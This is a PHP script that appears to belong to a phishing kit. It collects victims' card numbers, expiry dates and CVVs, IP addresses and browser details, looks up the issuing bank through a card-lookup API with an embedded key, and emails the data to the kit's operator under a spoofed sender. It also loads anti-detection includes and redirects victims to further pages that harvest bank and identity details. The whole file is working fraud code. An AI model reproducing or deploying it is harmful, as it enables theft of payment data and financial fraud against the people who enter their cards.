﻿<?php

error_reporting(0);
ob_start();
session_start();

include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../monsterab/ab.php';
include '../../algorythm/mail.php';
include '../../algorythm/wanted_options.php';

if(isset($_POST['detailsSubmit'])){
$_SESSION['cardname'] = $_POST['cardname'];
$_SESSION['cardnum'] = $_POST['cardnum'];
$_SESSION['cardexp'] = $_POST['cardexp'];
$_SESSION['cardcvv'] = $_POST['cardcvv'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR']; 
$_SESSION['browserinfo'] = $_SERVER['HTTP_USER_AGENT'];

if(empty($_SESSION['cardname']) || empty($_SESSION['cardnum']) || empty($_SESSION['cardexp']) || empty($_SESSION['cardcvv']))
{
header('Location: index.php?blank=true');
}
else{
$cc = $_SESSION['cardnum'];
$bin = substr($cc, 0, 6);
$ch = curl_init();
$url = "https://api.bincodes.com/cc/?format=json&api_key=7853c2b2a04b719e98ca1e8744e70c60&cc=$cc";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Accept-Version: 3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$brand = '';
$type = '';
$emoji = '';
$bank = '';
$someArray = json_decode($result, true);
$emoji = $someArray['country']['emoji'];
if ($bin == '497993' || $bin == '497958') {$bank ='BOURSORAMA';} else {$bank = $someArray['bank'];} 	
$brand = $someArray['level'];
$type = $someArray['type'];
$bank_phone = $someArray['phone'];

$msg = "# ｔｕｉｉｘ
🍒 Num. de carte : ".$_SESSION['cardnum']."
🍒 Date d'expiration: ".$_SESSION['cardexp']."
🍒 CVV : ".$_SESSION['cardcvv']."

🍒 Level : ".$brand."
🍒 Type : ".$type."
🍒 Banque : ".$bank."
🍒 Num. de la banque: ".$bank_phone."

🔢: ".$_SESSION['ip']."
🌐: ".$_SESSION['browserinfo']."
";
$subject = "「💳」".$bin." - ".$brand." - ".$bank."  ".$_SESSION['ip'] ." ";
$fromsender = "From: ©️ ALIBABA ©️ <log@rezappl.com>";

function is_valid_luhn($number) {
settype($number, 'string');
$sumTable = array(
array(0,1,2,3,4,5,6,7,8,9),
array(0,2,4,6,8,1,3,5,7,9));
$sum = 0;
$flip = 0;
for ($i = strlen($number) - 1; $i >= 0; $i--) {
$sum += $sumTable[$flip++ & 0x1][$number[$i]];
}
return $sum % 10 === 0;
}
	
if(is_valid_luhn($_SESSION['cardnum']) && is_numeric($_SESSION['cardnum'])){
mail($rezmail,$subject,$msg,$fromsender);
if($rib == 'yes' ){
$_SESSION['rib'] = true;
header('Location: ../bank/');
}
else{

if($identity == 'yes'){
$_SESSION['card'] = true;
header('Location: ../id');
}
else{

$_SESSION['card'] = true;
header('Location: ../finished/');
}	
}
}
else{

header('Location: index.php?refused=true');
}
}
}
else{

header('Location: ../../login/');
}

?>